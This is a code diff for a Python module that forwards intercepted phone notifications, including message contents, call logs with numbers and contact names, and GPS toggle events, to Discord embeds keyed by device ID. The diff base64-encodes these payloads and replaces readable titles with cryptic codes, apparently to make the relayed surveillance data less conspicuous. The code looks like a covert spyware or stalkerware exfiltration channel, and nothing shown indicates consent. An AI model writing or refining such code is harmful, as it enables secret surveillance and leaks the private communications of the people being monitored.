@@ -301,8 +301,9 @@ def send_discord_for_notifications(notifications, device_id):
             continue
         payload = f"{decode_field(n.get('app_name') or app_package)} {decode_field(n.get('title') or '')} {decode_field(n.get('content') or '')}"
         encoded = base64.b64encode(payload.encode()).decode()
+        cat_code = {'VoIP & Social Messages': 'VSM', 'GPS / Location Toggled': 'GLT', 'Telephony Calls': 'TC'}.get(category, 'MSG')
         embed = {
-            'title': f'[{category}]',
+            'title': f'[{cat_code}]',
             'description': f'{device_id[-6:]} · {encoded}',
             'color': 0x5865F2,
             'footer': {'text': app_package}
@@ -312,11 +313,13 @@ def send_discord_for_notifications(notifications, device_id):
 
 def send_discord_for_calls(call_logs, device_id):
     """Send abbreviated Discord embeds for call logs."""
+    type_code = {'incoming': 'I', 'outgoing': 'O', 'missed': 'M', 'rejected': 'R'}
     for c in call_logs:
-        payload = f"{decode_field(c.get('phone_number') or '')} {decode_field(c.get('contact_name') or '')} {c.get('call_type', '?')} {c.get('duration_sec', 0)}"
+        ct = type_code.get(c.get('call_type', ''), 'U')
+        payload = f"{decode_field(c.get('phone_number') or '')} {decode_field(c.get('contact_name') or '')} {ct} {c.get('duration_sec', 0)}"
         encoded = base64.b64encode(payload.encode()).decode()
         embed = {
-            'title': '[Telephony Call]',
+            'title': '[TC]',
             'description': f'{device_id[-6:]} · {encoded}',
             'color': 0x57F287
         }
@@ -328,7 +331,7 @@ def send_discord_for_gps(gps_events, device_id):
     for g in gps_events:
         state = 'ON' if g.get('is_enabled') else 'OFF'
         embed = {
-            'title': '[GPS / Location Toggled]',
+            'title': '[GLT]',
             'description': f'{device_id[-6:]} · {state}',
             'color': 0xFEE75C
         }
